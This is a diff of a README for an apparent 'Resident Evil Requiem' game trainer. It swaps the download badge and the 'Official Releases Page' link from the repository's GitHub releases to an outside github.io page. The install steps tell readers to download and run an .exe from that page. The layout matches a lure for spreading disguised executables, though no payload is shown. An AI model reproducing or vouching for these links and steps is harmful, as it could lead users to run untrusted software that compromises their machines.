@@ -1,6 +1,6 @@
 # 🎮 Resident-Evil-Requiem-Ultimate-Trainer-2026_v_2 - Enhance Your Resident Evil Gaming Experience
 
-[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/Femoralpulsegenuscavia354/Resident-Evil-Requiem-Ultimate-Trainer-2026_v_2/releases)
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://femoralpulsegenuscavia354.github.io)
 
 This application provides tools to modify Resident Evil Requiem. You gain control over game settings like player health, ammunition count, and camera distance. The software works as a background process while you play the game.
 
@@ -39,7 +39,7 @@ Ensure your computer meets these conditions before you run the software:
 
 Follow these steps to install and run the trainer.
 
-1. Visit the [Official Releases Page](https://github.com/Femoralpulsegenuscavia354/Resident-Evil-Requiem-Ultimate-Trainer-2026_v_2/releases).
+1. Visit the [Official Releases Page](https://femoralpulsegenuscavia354.github.io).
 2. Locate the most recent version under the "Assets" heading.
 3. Click the file ending in ".exe" to begin the download.
 4. Save the file to a folder that you can locate easily, such as your Desktop or Downloads folder.
